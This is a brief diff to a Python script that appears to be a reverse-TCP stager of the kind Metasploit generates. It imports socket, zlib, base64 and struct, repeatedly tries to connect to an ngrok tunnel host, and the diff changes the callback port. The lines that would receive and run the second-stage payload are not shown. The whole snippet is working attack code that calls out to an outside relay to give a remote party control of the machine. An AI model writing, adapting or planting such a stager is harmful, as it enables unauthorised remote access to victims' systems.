@@ -2,7 +2,7 @@ import socket,zlib,base64,struct,time
 for x in range(10):
     try:
         s=socket.socket(2,socket.SOCK_STREAM)
-        s.connect(('2.tcp.eu.ngrok.io',15577))
+        s.connect(('2.tcp.eu.ngrok.io',11843))
         break
     except:
         time.sleep(5)
